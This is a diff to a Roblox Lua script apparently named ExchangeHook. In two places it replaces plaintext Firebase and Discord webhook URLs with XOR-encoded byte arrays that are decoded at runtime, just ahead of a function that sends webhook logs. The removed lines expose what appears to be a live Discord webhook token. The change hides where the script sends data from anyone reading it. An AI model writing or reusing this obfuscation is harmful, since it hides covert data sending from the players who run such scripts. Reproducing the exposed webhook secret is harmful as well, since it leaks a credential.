@@ -5,8 +5,11 @@ do
     local RS           = game:GetService("RunService")
     local LP           = game:GetService("Players").LocalPlayer
 
-    local FIREBASE_URL = "https://exchangehookkeys-default-rtdb.firebaseio.com/"
-    local WEBHOOK_URL  = "https://discord.com/api/webhooks/1478236610561572944/ozF0og8rIZ830FYVh0Kan3-nKTtM5K2ESJNmA4frQKq0tQxSNPUI3Mp3dO8BnWRP5XLQ"
+    local function _xc(s,k) local o={} for i=1,#s do o[i]=string.char(bit32.bxor(s:byte(i),k[((i-1)%#k)+1])) end return table.concat(o) end
+    local _fb_enc={111,103,107,91,116,41,48,4,98,107,124,67,102,125,120,78,111,124,112,64,108,118,102,88,42,119,122,77,102,102,115,95,42,97,107,79,101,61,121,66,117,118,125,74,116,118,118,68,41,112,112,70,40}
+    local _wh_enc={101,105,65,55,126,39,26,104,105,116,70,36,98,111,81,105,110,114,88,104,108,109,92,104,122,120,87,47,98,114,94,52,34,44,1,112,53,47,6,113,59,44,5,114,59,44,0,112,63,36,1,115,34,114,79,1,61,114,82,127,127,84,111,127,62,45,115,30,91,117,5,12,108,115,6,106,99,86,97,51,64,40,126,117,72,78,127,9,96,92,1,33,127,76,126,54,61,105,100,63,94,83,101,18,68,46,120,55,62,121,122,127,79,115,98,21,93,40,109,11,92}
+    local FIREBASE_URL = _xc(string.char(table.unpack(_fb_enc)),{7,19,31,43})
+    local WEBHOOK_URL  = _xc(string.char(table.unpack(_wh_enc)),{13,29,53,71})
     local FOLDER       = "ExchangeHook"
     local keyEvent     = Instance.new("BindableEvent")
 
@@ -4832,7 +4835,8 @@ Lighting          = Secure.Lighting
 local Stats             = Secure.Stats
 AiZones           = workspace:FindFirstChild("AiZones")
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1478236610561572944/ozF0og8rIZ830FYVh0Kan3-nKTtM5K2ESJNmA4frQKq0tQxSNPUI3Mp3dO8BnWRP5XLQ"
+local _wh2={101,105,65,55,126,39,26,104,105,116,70,36,98,111,81,105,110,114,88,104,108,109,92,104,122,120,87,47,98,114,94,52,34,44,1,112,53,47,6,113,59,44,5,114,59,44,0,112,63,36,1,115,34,114,79,1,61,114,82,127,127,84,111,127,62,45,115,30,91,117,5,12,108,115,6,106,99,86,97,51,64,40,126,117,72,78,127,9,96,92,1,33,127,76,126,54,61,105,100,63,94,83,101,18,68,46,120,55,62,121,122,127,79,115,98,21,93,40,109,11,92}
+local WEBHOOK_URL = (function(s,k) local o={} for i=1,#s do o[i]=string.char(bit32.bxor(s:byte(i),k[((i-1)%#k)+1])) end return table.concat(o) end)(string.char(table.unpack(_wh2)),{13,29,53,71})
 
 local function sendWebhookLog()
     local ok, err = pcall(function()
